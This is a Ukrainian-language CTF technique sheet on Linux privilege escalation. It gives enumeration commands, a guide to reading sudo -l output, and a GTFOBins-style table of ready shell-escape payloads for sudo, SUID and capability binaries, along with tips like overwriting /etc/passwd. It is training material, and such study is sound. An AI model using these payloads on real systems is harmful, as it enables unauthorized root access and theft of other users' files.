# Technique: Linux Permissions / SUID / Capabilities / sudo

**Навіщо:** зрозуміти, які «легальні» механізми дають доступ до чужих файлів чи виконання від іншого юзера. У цьому CTF root не мета, але ці механізми часто відкривають доступ до прапорців/файлів інших юзерів.
← [post-exploitation](../01-roadmaps/post-exploitation.md) · [lateral-movement](../02-workflows/lateral-movement.md)

---

## Права файлів (швидко)
`-rwxr-x---` = власник(rwx) група(r-x) інші(---). Цікавий випадок — коли поточний юзер потрапляє у «інші/група» з `r` на чужому конфігу/ключі.
```bash
ls -la /home/*/              # що читається у чужих домівках
find / -perm -o+r -path '*/.ssh/*' 2>/dev/null   # світово читабельні ключі
find / -type f -writable 2>/dev/null | grep -vE '^/proc'  # куди є запис
```

## Знайти вектори
```bash
sudo -l 2>/dev/null                     # що дозволено запускати
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID
getcap -r / 2>/dev/null                 # capabilities
```

## sudo -l — як читати вивід
| Вивід | Що означає | Дія |
|---|---|---|
| `(root) NOPASSWD: /usr/bin/awk` | запуск awk від root без пароля | escape з таблиці нижче |
| `(user2) /path/script` | запуск від user2 | `sudo -u user2 /path/script` → доступ до файлів user2 |
| `(root) /usr/bin/less /var/log/x` | читання файлу від root | `less` → `!/bin/sh` або читати інші файли |
| `env_keep += LD_PRELOAD` | можна підсунути бібліотеку | LD_PRELOAD-хак (рідко на CTF) |
| `(ALL) ALL` | повний sudo | `sudo /bin/bash` |

---

## Escapes — готові payload-и (GTFOBins вбудовано)
Знайдено бінар у `sudo -l`, SUID або capability → узяти рядок звідси. **Офлайн GTFOBins не потрібен.**

| Бінар | sudo (`sudo <bin>`) | SUID (`./<bin>`, зберегти euid) |
|---|---|---|
| **bash** | `sudo bash` | `./bash -p` |
| **sh** | `sudo sh` | `./sh -p` |
| **find** | `sudo find . -exec /bin/sh \; -quit` | `./find . -exec /bin/sh -p \; -quit` |
| **vim** | `sudo vim -c ':!/bin/sh'` | `./vim -c ':py3 import os;os.execl("/bin/sh","sh","-pc","reset;exec sh -p")'` |
| **vi** | `sudo vi -c ':!/bin/sh'` | те саме, що vim |
| **nano** | `sudo nano` → `^R^X`, далі `reset; sh 1>&0 2>&0` | обмежено |
| **less** | `sudo less /etc/profile` → `!/bin/sh` | `./less file` → `!/bin/sh` |
| **more** | `sudo more /etc/profile` → `!/bin/sh` | — |
| **man** | `sudo man man` → `!/bin/sh` | — |
| **awk** | `sudo awk 'BEGIN{system("/bin/sh")}'` | `./awk 'BEGIN{system("/bin/sh")}'` |
| **python** | `sudo python -c 'import os;os.system("/bin/sh")'` | `./python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
| **perl** | `sudo perl -e 'exec "/bin/sh";'` | `./perl -e 'use POSIX;setuid(0);exec "/bin/sh";'` |
| **env** | `sudo env /bin/sh` | `./env /bin/sh -p` |
| **tar** | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` | те саме з `./tar` |
| **nmap** | `TF=$(mktemp);echo 'os.execute("/bin/sh")'>$TF;sudo nmap --script=$TF` | те саме; старий `nmap --interactive` → `!sh` |
| **git** | `sudo git -p help config` → `!/bin/sh` | `PAGER='sh -c "exec sh 0<&1"' ./git -p help` |
| **ftp** | `sudo ftp` → `!/bin/sh` | — |
| **ed** | `sudo ed` → `!/bin/sh` | — |
| **node** | `sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'` | + `process.setuid(0)` |
| **tee** | запис у захищений файл: `echo DATA \| sudo tee /path` | — |
| **cp** | перезапис файлу (напр. свій `/etc/passwd`) | читання чужих файлів |
| **zip** | `sudo zip /tmp/z.zip /etc/hosts -T -TT 'sh #'` | те саме |

> SUID: ключове — зберегти euid. Де є прапор `-p` (`bash -p`, `find -p`, `env -p`) — використати його; у python/perl — `setuid(0)`; інакше shell впаде до звичайного юзера.
> Якщо бінара в таблиці нема — логіка: «він уміє читати файл, писати файл або запускати команду?» → та сама дія відбувається з правами власника/root.

## Capabilities
```bash
getcap -r / 2>/dev/null
```
| Capability на бінарі | Payload |
|---|---|
| `cap_setuid` на python | `./python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
| `cap_setuid` на perl | `./perl -e 'use POSIX;POSIX::setuid(0);exec "/bin/sh";'` |
| `cap_dac_read_search` | читання будь-якого файлу (напр. через `tar`/власний рідер) — доступ до чужих прапорців |
| `cap_dac_override` | запис у будь-який файл |

## Як це дає прапорці (без «рута заради рута»)
- `sudo -l`/escape дозволяє прочитати чужий файл → там прапорець/креди.
- SUID/cap бінар читає файл іншого юзера → прапорець.
- Запис у чужий скрипт, який хтось запускає → [cron/services](cron-services.md).

## Пастки
- Не кожен SUID = вектор; стандартні (`passwd`, `mount`, `ping`, `su`) зазвичай нецікаві — шукати нетипові.
- SUID без `-p`/`setuid` дасть shell звичайного юзера (euid скинеться) — марно.
- `sudo -l` з `NOPASSWD` на «читалці» (less/more/man) — це вже доступ до будь-яких файлів.
